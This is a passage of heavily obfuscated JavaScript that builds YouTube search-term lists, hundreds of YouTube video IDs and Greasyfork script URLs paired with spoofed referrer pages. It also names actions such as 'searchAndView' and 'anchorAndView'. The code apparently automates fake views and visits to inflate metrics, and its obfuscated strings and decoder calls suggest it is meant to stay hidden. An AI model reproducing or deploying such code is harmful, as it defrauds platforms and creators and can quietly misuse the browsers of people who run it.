searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + Y(0x17) + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](-0x25a9 * -0x1 + 0x268c + -0x4c2b)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](0x19d5 + -0x17de + -0x11 * 0x1d)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + Z(0xa) + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](-0xd54 + 0x79 * -0x1f + 0x1bfe);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    Y(0x1) + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    a0(0x1f, 'qM21') + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    Z(0x11) + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    Z(0x23) + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    Z(0xc) + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + Y(0x21) + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + a0(0x4, '&F]^') + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + Z(0xd) + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + Y(0x22),
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
